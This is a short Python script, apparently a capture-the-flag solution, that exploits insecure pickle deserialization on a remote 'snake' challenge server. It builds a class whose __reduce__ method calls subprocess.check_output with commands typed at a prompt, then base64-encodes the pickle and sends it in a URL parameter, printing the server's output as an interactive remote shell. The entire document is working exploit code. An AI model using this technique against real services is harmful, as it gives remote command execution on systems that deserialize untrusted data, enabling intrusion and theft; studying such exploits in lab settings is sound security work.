import requests
import base64
import pickle

class Foo(object):
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        import subprocess
        return (subprocess.check_output,
                 (self.cmd,))

while True:
    cmd = input("$ ")
    cmd = cmd.split(" ")

    data = Foo(cmd)
    data = pickle.dumps(data)
    data = base64.b64encode(data).decode("utf-8")

    print("\n".join(requests.get("https://snake.ais3.org/?data={}".format(data)).text[2:-1].split("\\n")))


